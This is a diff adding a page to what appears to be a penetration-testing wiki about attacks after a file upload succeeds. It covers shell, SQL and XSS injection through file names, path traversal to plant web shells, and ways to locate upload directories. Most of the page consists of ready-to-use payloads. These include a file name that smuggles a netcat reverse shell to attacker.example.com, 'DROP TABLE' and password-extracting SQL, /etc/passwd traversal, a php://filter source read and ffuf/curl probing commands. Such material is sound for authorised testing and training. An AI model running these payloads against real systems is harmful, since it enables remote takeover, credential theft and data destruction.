@@ -1,0 +1,368 @@
+---
+title: Post-upload
+description: Attacks after the upload succeeds - filename-based command/SQL/XSS injection, finding the upload directory, and Windows-specific filename tricks.
+mitre: [T1190, T1059, T1083]
+d3fend: [D3-FA]
+impact: [RCE, ServerSideEval, FileRead]
+owasp: [A03]
+sidebar:
+  order: 8
+  label: Post-upload
+---
+import { Aside } from '@astrojs/starlight/components';
+
+## TL;DR
+
+Once the upload succeeds, two things often matter: what happened to the filename (was it used in a shell command? an SQL query? rendered in HTML?), and where did the file land?
+
+```
+# Filename as a command-injection vector
+filename="file$(whoami).jpg"            # if app runs `mv file.jpg /uploads/`
+filename="file`whoami`.jpg"
+filename="file.jpg||whoami"
+
+# Filename as an XSS vector
+filename="<img src=x onerror=alert(1)>.jpg"
+
+# Filename as an SQL injection vector
+filename="file';select+sleep(5);--.jpg"
+
+# Finding the upload directory when not disclosed
+ffuf -w /opt/useful/SecLists/Discovery/Web-Content/raft-medium-directories.txt:FUZZ \
+     -u https://target/FUZZ/ -mc 200,403
+
+# Windows-specific filename tricks
+filename="shell.aspx:.jpg"              # alternate data stream - writes shell.aspx
+filename="CON.aspx"                     # reserved name → error reveals path
+filename="HAC~1.TXT"                    # 8.3 short name reference
+```
+
+Success indicator: depends on the technique - injection succeeds, hidden upload directory found, or error message discloses sensitive info.
+
+## Filename injection
+
+The uploaded filename frequently flows into other parts of the application - shell commands, SQL queries, HTML rendering, log entries. Each of these is a separate injection sink if the filename isn't sanitized.
+
+### Command injection in filename
+
+When the application shells out to handle the upload (image processing, virus scan, archive extraction, file move), the filename can become a command-injection vector:
+
+```bash
+# Application code (vulnerable)
+shell_exec("mv /tmp/upload " . $uploadDir . "/" . $_FILES["file"]["name"]);
+
+# Attacker filename
+filename="evil.jpg; nc -e /bin/bash attacker.example.com 4444; #"
+# Resulting shell command:
+mv /tmp/upload /uploads/evil.jpg; nc -e /bin/bash attacker.example.com 4444; #
+```
+
+The `;` ends the `mv` command and starts a new one - the reverse shell command. RCE through the upload's filename rather than its content.
+
+#### Payload variants
+
+```
+file.jpg; id
+file.jpg && id
+file.jpg | id
+file.jpg`id`.jpg
+file$(id).jpg
+file.jpg' && id #
+```
+
+For applications that wrap the filename in quotes, escape out:
+
+```
+"; id; echo "
+'; id; echo '
+```
+
+Different shell metacharacters work depending on quoting and shell version. See [Command Injection](/codex/web/command-injection/) for the comprehensive treatment - this section is about the upload-specific delivery.
+
+#### When this works
+
+The vulnerability appears when the application:
+
+1. Uses `system()`, `exec()`, `shell_exec()`, or similar to handle the uploaded file
+2. Inserts the filename directly into the command string
+3. Doesn't escape shell metacharacters
+
+Common in:
+
+- Custom file-conversion features (`ffmpeg input.mp4 output.mp4`)
+- Custom virus scanning (`clamscan filename`)
+- Image processing pipelines (`convert input.jpg output.png`)
+- Archive extraction (`unzip filename.zip`)
+- Backup / move operations
+
+### SQL injection in filename
+
+When the filename gets stored in a database and the storage uses raw SQL:
+
+```php
+// Vulnerable
+mysqli_query($conn, "INSERT INTO uploads (filename) VALUES ('" . $_FILES["file"]["name"] . "')");
+```
+
+```
+filename="file'); DROP TABLE uploads; --.jpg"
+filename="file', (SELECT password FROM users LIMIT 1)); --.jpg"
+filename="file' UNION SELECT password FROM users; --.jpg"
+```
+
+See [SQL Injection](/codex/web/sqli/) for the full treatment.
+
+#### Time-based detection
+
+When SQL injection in filename isn't visible directly, time-based detection works:
+
+```
+filename="file';select+sleep(5);--.jpg"
+```
+
+If the upload response takes 5+ seconds, the filename is being executed as SQL. Even when the response itself doesn't reflect anything, the delay confirms the bug.
+
+### XSS in filename
+
+When the filename is displayed back to users (file lists, upload confirmation pages, audit logs viewed by admins):
+
+```
+filename="<script>alert(document.domain)</script>.jpg"
+filename="<img src=x onerror=alert(1)>.jpg"
+filename="javascript:alert(1).jpg"
+filename="onmouseover=alert(1) .jpg"
+```
+
+The injection fires when the filename is rendered in HTML without escaping. Common locations:
+
+- "Your file has been uploaded as: `<filename>`" - confirmation message
+- File-listing pages
+- Admin audit logs
+- Email notifications sent to administrators
+
+Stored XSS, full session-stealing potential.
+
+### Path traversal in filename
+
+When the application uses the filename to determine where to write:
+
+```php
+// Vulnerable
+move_uploaded_file($_FILES["file"]["tmp_name"], "/uploads/" . $_FILES["file"]["name"]);
+```
+
+```
+filename="../../../etc/cron.d/evil"
+filename="../../../../var/www/html/shell.php"
+```
+
+The traversal escapes the uploads directory and writes elsewhere. Depending on the web server user's permissions, this can:
+
+- Overwrite system config files (often denied by permissions)
+- Drop scripts in web-served directories (`/var/www/html/shell.php`)
+- Create cron jobs (`/etc/cron.d/evil` - usually root-only)
+- Corrupt database files
+
+The web-served-directory case is the practical one - `/uploads/../../../var/www/html/shell.php` lands in the document root, executable as PHP, bypassing all upload-directory restrictions.
+
+### Filename-based attacks on Windows
+
+```
+filename="shell.aspx:.jpg"          # Alternate Data Stream - writes shell.aspx
+filename="shell.aspx::$DATA"        # same, different syntax
+filename="shell.aspx.    .  "       # trailing dots/spaces - Windows strips
+filename="shell.aspx ."             # similar
+filename="HAC~1.TXT"                # 8.3 short name reference
+```
+
+The first form abuses NTFS Alternate Data Streams - when Windows receives a filename containing `:`, it interprets everything after the colon as a stream name. The base file (`shell.aspx`) is what actually gets written to disk; the stream name (`.jpg`) is metadata. The application sees `shell.aspx:.jpg` and runs its `.jpg` validation, but the on-disk file is `shell.aspx`.
+
+## Finding the upload directory
+
+After a successful upload, the file URL is usually displayed somewhere. When it isn't, you need to find where the file went.
+
+### From the upload response
+
+The cleanest path - many applications return the URL in the response:
+
+```json
+{
+  "success": true,
+  "path": "/uploads/2024/05/shell.phar",
+  "url": "https://target.example.com/uploads/2024/05/shell.phar"
+}
+```
+
+Check both the HTTP response body and headers (sometimes a `Location:` header is the only place the path appears).
+
+### From subsequent page renders
+
+When the upload is associated with a user-visible feature (profile picture, document attachment), view the page after upload and look at the source:
+
+```html
+<img src="/profile_images/user123/avatar.png">
+<a href="/attachments/abc123/document.pdf">View attachment</a>
+```
+
+The `src` and `href` attributes show the URL path, which usually maps directly to the on-disk path.
+
+### From wordlist fuzzing
+
+When the URL isn't disclosed anywhere:
+
+```bash
+# Common upload directories
+ffuf -w /opt/useful/SecLists/Discovery/Web-Content/raft-medium-directories.txt:FUZZ \
+     -u https://target/FUZZ/ \
+     -mc 200,301,302,403
+
+# Specifically targeting upload-ish names
+cat > /tmp/upload-dirs.txt <<'EOF'
+uploads
+upload
+files
+file
+attachments
+avatars
+profile_images
+profile
+images
+img
+media
+storage
+public/uploads
+static/uploads
+user_data
+user_content
+content
+shared
+documents
+EOF
+
+ffuf -w /tmp/upload-dirs.txt:FUZZ \
+     -u https://target/FUZZ/ \
+     -mc 200,301,302,403
+```
+
+Hits at status 403 are often as interesting as 200 - they confirm the directory exists, even if directory listing is disabled. Try accessing your specific filename within the 403'd directory.
+
+### From error messages
+
+Force the application to error during upload - the error often reveals the upload directory:
+
+```
+filename="../../../../../../../etc/passwd"        # path traversal in filename
+filename="file/with/slashes.jpg"                  # invalid filename chars
+filename=<5000-character string>                  # overly long filename
+filename="$( perl -e 'print chr(0)x4096' )"       # null bytes
+```
+
+Verbose errors like:
+
+```
+Warning: move_uploaded_file(): Unable to move '/tmp/upload12345' to '/var/www/html/uploads/...'
+```
+
+…reveal the upload directory directly.
+
+### From source disclosure
+
+When LFI is available, read the upload-handling source:
+
+```
+?page=php://filter/convert.base64-encode/resource=upload
+```
+
+Look for the `$uploadDir` or equivalent variable - it tells you exactly where files land. See the [LFI cluster](/codex/web/lfi/) for the file-disclosure path.
+
+### Concurrent-upload race
+
+When the upload directory disallows directory listing AND filenames are randomized, find your file by uploading two identical files simultaneously:
+
+```bash
+# Send two uploads in parallel with same content
+curl -F "uploadFile=@shell.phar" https://target/upload &
+curl -F "uploadFile=@shell.phar" https://target/upload &
+wait
+```
+
+The second one may fail with "file already exists" - and the error message often includes the resolved path of the first file.
+
+## Reserved names (Windows)
+
+Windows reserves certain filenames at the OS level:
+
+```
+CON, PRN, AUX, NUL
+COM1 through COM9
+LPT1 through LPT9
+```
+
+When the upload tries to write to a file with one of these names, Windows refuses - and the application typically errors out, revealing the upload path in the error message.
+
+```
+filename="CON.aspx"
+filename="LPT1.jpg"
+filename="NUL"
+```
+
+The error path is:
+
+```
+move_uploaded_file: Unable to move '/tmp/upload' to 'C:\inetpub\wwwroot\uploads\CON.aspx': 
+The system cannot find the path specified.
+```
+
+The full path leak is the win - even though the upload itself failed.
+
+## 8.3 short filename references
+
+Legacy Windows filename convention - every long filename has a corresponding 8.3 short name:
+
+```
+hackthebox.txt         → HACKTH~1.TXT
+my-document.pdf        → MY-DOC~1.PDF
+```
+
+If the application uses long filenames but accepts uploads with short-name variants, race conditions and overwrites become possible:
+
+```
+filename="WEB~1.CONFIG"   # may resolve to "web.config"
+filename="HAC~2.TXT"      # may match a different file than expected
+```
+
+This is mostly historical - modern Windows can disable 8.3 generation, and most apps don't have this issue. Worth trying when other approaches fail and the target is Windows.
+
+## Detection-only checks
+
+A non-destructive probe to map the upload directory:
+
+```bash
+# 1. Upload a file with a unique content marker
+echo "UNIQUE_PROBE_$(date +%s)" > probe.txt
+curl -F "uploadFile=@probe.txt" https://target/upload
+
+# 2. Search for it via Google/Bing site search (if the target is indexed)
+# site:target.example.com "UNIQUE_PROBE_..."
+
+# 3. Or fuzz common upload directories looking for the file
+for dir in uploads upload files attachments avatars images media; do
+    response=$(curl -s "https://target/$dir/probe.txt")
+    if echo "$response" | grep -q "UNIQUE_PROBE_"; then
+        echo "Found in $dir"
+    fi
+done
+```
+
+The marker-based search avoids generating noise in the application's own logs (no fuzz against the application's URLs, just direct file accesses).
+
+## Notes
+
+- **Filename injection is shockingly common.** When an application invokes external tools on uploaded files, the filename frequently flows into the shell command without proper escaping. Test by uploading `file$(id).jpg` - if the upload succeeds and the response or subsequent file listing shows the actual user, RCE is possible.
+- **Path disclosure isn't a finding on its own** but it's a meaningful chain primitive. Discovering that uploads land at `/var/www/html/uploads/` enables direct visits, LFI-chain targeting, and second-order attacks.
+- **Race conditions during upload.** Some applications do upload → validation → quarantine → final-move. The window between "uploaded" and "moved to quarantine" can be exploited - race the validation by uploading and accessing the file simultaneously, sometimes catching it before quarantine.
+- **Windows reserved names cause genuine errors.** Uploading `CON.aspx` on a Windows server reliably crashes the file move and reveals the path. Linux servers don't have this issue (any filename is allowed).
+
+<Aside type="tip">
+The order of operations for an upload-suspect target: try arbitrary upload first, then bypasses ([blacklist](/codex/web/uploads/extension-blacklist/) → [whitelist](/codex/web/uploads/extension-whitelist/) → [content](/codex/web/uploads/content-type-bypass/)), then limited-upload attacks, *then* filename injection. The filename injection vector is often missed because it's last to test, but it's frequently the only path against well-defended uploads.
+</Aside>
